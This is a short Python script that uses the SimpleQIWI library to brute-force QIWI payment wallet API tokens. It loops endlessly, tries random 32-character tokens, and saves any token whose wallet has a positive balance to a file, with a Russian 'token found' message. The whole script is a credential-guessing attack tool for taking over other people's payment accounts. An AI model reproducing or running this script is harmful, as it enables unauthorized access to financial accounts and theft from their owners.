import random
from random import randint
from SimpleQIWI import *
m=32
phone=''
x=0
while True:
    x+=1
    token=(''.join([random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for x in range(m)]))
#    token='f4417133c2a8b643964b34855190d2ad'
    try:
        api=QApi(token=token,phone=phone)
        if api.balance[0]>0:
            print(api.balance[0])
            print('SUCESFULL - ТОКЕН НАЙДЕН')
            f=open("suc_full.txt", 'w')
            f.write(token)
            break
    except:
        print('token ',x,'[-]')
        
